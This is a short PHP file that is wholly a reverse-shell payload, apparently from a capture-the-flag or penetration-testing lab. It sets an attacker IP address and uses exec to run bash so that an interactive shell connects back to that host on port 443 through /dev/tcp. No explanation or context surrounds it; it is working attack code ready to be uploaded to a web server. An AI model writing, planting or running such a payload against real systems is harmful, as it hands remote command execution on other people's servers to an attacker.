<?php
	$MY_IP = "10.10.16.57";
    exec("/bin/bash -c 'bash -i >& /dev/tcp/$MY_IP/443 0>&1'");
?>

